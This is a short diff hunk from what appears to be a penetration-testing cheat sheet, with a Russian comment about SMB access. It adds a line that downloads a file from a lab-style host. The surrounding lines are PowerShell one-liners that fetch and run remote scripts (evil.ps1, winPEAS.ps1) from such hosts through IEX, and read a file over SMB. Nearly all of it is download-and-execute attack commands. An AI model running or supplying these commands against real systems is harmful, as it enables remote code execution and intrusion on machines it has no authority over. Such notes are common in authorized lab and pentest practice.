@@ -33,6 +33,8 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
 
 echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile 
 
+iwr -uri http://10.10.14.9/test -outfile test
+
 # Доступ к ресурсу SMB
 
 Get-Content //10.10.14.4/file
